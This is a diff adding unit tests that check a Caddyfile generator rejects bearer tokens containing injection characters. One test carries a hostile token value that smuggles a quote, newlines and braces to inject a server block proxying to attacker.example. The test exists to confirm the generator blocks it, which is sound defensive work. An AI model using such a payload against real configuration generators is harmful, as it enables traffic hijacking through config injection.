@@ -1172,3 +1172,77 @@ describe('generateFullCaddyfile — Phase 256-04 LIVOS-008 forward_auth gate', (
 		expect(out).toContain('reverse_proxy 127.0.0.1:8080')
 	})
 })
+
+// ─── Phase 257-06 WS-F — upstreamBearer charset validation (LIVOS-035) ───────
+describe('generateFullCaddyfile — Phase 257-06 LIVOS-035 upstreamBearer charset gate', () => {
+	test('WS-F.035.T1 — a clean token is emitted as the Bearer header', () => {
+		const out = generateFullCaddyfile(
+			{
+				mainDomain: 'bruce.livinity.io',
+				subdomains: [
+					{
+						subdomain: 'open-design',
+						appId: 'od',
+						port: 9200,
+						enabled: true,
+						upstreamBearer: 'abc.DEF-123_xyz',
+					},
+				],
+			},
+			false,
+			false,
+			[],
+		)
+		expect(out).toContain('header_up Authorization "Bearer abc.DEF-123_xyz"')
+		expect(out).toContain('header_up Host 127.0.0.1:9200')
+	})
+
+	test('WS-F.035.T2 — an injection token (quote/newline/brace/dollar-brace) is NOT emitted', () => {
+		const hostile = 'foo"\n}\n:80 {\nreverse_proxy http://attacker.example\n}'
+		const out = generateFullCaddyfile(
+			{
+				mainDomain: 'bruce.livinity.io',
+				subdomains: [
+					{
+						subdomain: 'open-design',
+						appId: 'od',
+						port: 9200,
+						enabled: true,
+						upstreamBearer: hostile,
+					},
+				],
+			},
+			false,
+			false,
+			[],
+		)
+		// The malicious string must never reach the Caddyfile — bearer line omitted.
+		expect(out).not.toContain('attacker.example')
+		expect(out).not.toContain('Bearer foo')
+		expect(out).not.toContain('header_up Authorization')
+		// The block itself still emits (forward_auth + reverse_proxy), just without the bearer.
+		expect(out).toContain('reverse_proxy 127.0.0.1:9200')
+	})
+
+	test('WS-F.035.T3 — 256-04 forward_auth blocks preserved (no regression)', () => {
+		const out = generateFullCaddyfile(
+			{
+				mainDomain: 'bruce.livinity.io',
+				subdomains: [
+					{
+						subdomain: 'open-design',
+						appId: 'od',
+						port: 9200,
+						enabled: true,
+						upstreamBearer: 'OD_SECRET_TOKEN',
+					},
+				],
+			},
+			false,
+			false,
+			[],
+		)
+		expect(out).toContain('forward_auth')
+		expect(out).toContain('header_up Authorization "Bearer OD_SECRET_TOKEN"')
+	})
+})
